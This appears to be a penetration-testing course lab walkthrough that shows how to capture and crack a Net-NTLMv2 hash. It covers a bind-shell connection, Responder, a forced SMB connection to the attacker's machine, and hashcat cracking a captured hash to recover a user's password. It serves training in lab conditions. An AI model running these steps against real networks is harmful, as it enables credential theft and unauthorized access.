# Cracking Net-NTLMv2

Connect to the bind shell on port 4444
>``` shell
>kali@kali:~$ nc 192.168.50.211 4444
>
># ========== Expected Result ==========
>Microsoft Windows [Version 10.0.20348.707]
>(c) Microsoft Corporation. All rights reserved.
># =====================================
>
>C:\Windows\system32> whoami
>
># ========== Expected Result ==========
>whoami
>files01\paul
># =====================================
>
>C:\Windows\system32> net user paul
>
># ========== Expected Result ==========
>net user paul
>User name                    paul
>Full Name                    paul power
>Comment                      
>User's comment               
>Country/region code          000 (System Default)
>Account active               Yes
>Account expires              Never
>
>Password last set            6/3/2022 10:05:27 AM
>Password expires             Never
>Password changeable          6/3/2022 10:05:27 AM
>Password required            Yes
>User may change password     Yes
>
>Workstations allowed         All
>Logon script                 
>User profile                 
>Home directory               
>Last logon                   6/3/2022 10:29:19 AM
>
>Logon hours allowed          All
>
>Local Group Memberships      *Remote Desktop Users *Users                
>Global Group memberships     *None                 
>The command completed successfully.
># =====================================
>```

Starting Responder on interface tap0
>``` shell
>kali@kali:~$ kali@kali:~$ ip a
>
># ========== Expected Result ==========
>...
>3: tap0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 1000
>    link/ether 42:11:48:1b:55:18 brd ff:ff:ff:ff:ff:ff
>    inet 192.168.119.2/24 scope global tap0
>       valid_lft forever preferred_lft forever
>    inet6 fe80::4011:48ff:fe1b:5518/64 scope link 
>       valid_lft forever preferred_lft forever
># =====================================
>
>kali@kali:~$ sudo responder -I tap0 
>
># ========== Expected Result ==========
>                                         __
>  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
>  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
>  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
>                   |__|
>
>           NBT-NS, LLMNR & MDNS Responder 3.1.1.0
>
>  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
>  To kill this script hit CTRL-C
>...
>    HTTP server                [ON]
>    HTTPS server               [ON]
>    WPAD proxy                 [OFF]
>    Auth proxy                 [OFF]
>    SMB server                 [ON]
>...
>[+] Listening for events... 
># =====================================
>```

Using the dir command to create an SMB connection to our Kali machine
>``` shell
>C:\Windows\system32>dir \\192.168.119.2\test
>
># ========== Expected Result ==========
>dir \\192.168.119.2\test
>Access is denied.
># =====================================
>```

Responder capturing the Net-NTLMv2 Hash of paul
>``` shell
># ========== Expected Result ==========
>...
>[+] Listening for events... 
>[SMB] NTLMv2-SSP Client   : ::ffff:192.168.50.211
>[SMB] NTLMv2-SSP Username : FILES01\paul
>[SMB] NTLMv2-SSP Hash     : paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050CD1777D801B7585DF5719ACFBA0000000002000800360057004D00520001001E00570049004E002D00340044004E004800550058004300340054004900430004003400570049004E002D00340044004E00480055005800430034005400490043002E00360057004D0052002E004C004F00430041004C0003001400360057004D0052002E004C004F00430041004C0005001400360057004D0052002E004C004F00430041004C000700080000B050CD1777D801060004000200000008003000300000000000000000000000002000008BA7AF42BFD51D70090007951B57CB2F5546F7B599BC577CCD13187CFC5EF4790A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E003100310038002E0032000000000000000000 
># =====================================
>```

Contents of paul.hash and Hashcat mode
>``` shell
>kali@kali:~$ cat paul.hash 
>
># ========== Expected Result ==========
>paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050CD1777D801B7585DF5719ACFBA0000000002000800360057004D00520001001E00570049004E002D00340044004E00480055005800430034005400490043000400340057...
># =====================================
>
>kali@kali:~$ hashcat -hh | grep -i "ntlm"
>
># ========== Expected Result ==========
>   5500 | NetNTLMv1 / NetNTLMv1+ESS                           | Network Protocol
>  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                      | Network Protocol
>   5600 | NetNTLMv2                                           | Network Protocol
>  27100 | NetNTLMv2 (NT)                                      | Network Protocol
>   1000 | NTLM                                                | Operating System
># =====================================
>```

Cracking the Net-NTLMv2 hash of paul
>``` shell
>kali@kali:~$ hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
>
># ========== Expected Result ==========
>hashcat (v6.2.5) starting
>...
>
>PAUL::FILES01:1f9d4c51f6e74653:795f138ec69c274d0fd53bb32908a72b:010100000000000000b050cd1777d801b7585df5719acfba0000000002000800360057004d00520001001e00570049004e002d00340044004e004800550058004300340054004900430004003400570049004e002d00340044004e00480055005800430034005400490043002e00360057004d0052002e004c004f00430041004c0003001400360057004d0052002e004c004f00430041004c0005001400360057004d0052002e004c004f00430041004c000700080000b050cd1777d801060004000200000008003000300000000000000000000000002000008ba7af42bfd51d70090007951b57cb2f5546f7b599bc577ccd13187cfc5ef4790a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e003100310038002e0032000000000000000000:123Password123
>...
># =====================================
>```

RDP Connection as paul
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Cracking-Net-NTLMv2-1.png)

Lab 1 - Follow the steps outlined in this section to obtain the Net-NTLMv2 hash in Responder. Crack it and use it to connect to VM #1 (FILES01) with RDP. Find the flag on paul's desktop. Attention: If the bind shell is terminated it may take up to 1 minute until it is accessible again.
>``` shell
>
>```
>

Lab 2 - Enumerate VM #2 and find a way to obtain a Net-NTLMv2 hash via the web application. Important: Add marketingwk01 to your /etc/hosts file with the corresponding IP address of the machine. After you have obtained the Net-NTLMv2 hash, crack it, and connect to the system to find the flag.
>``` shell
>
>```
>
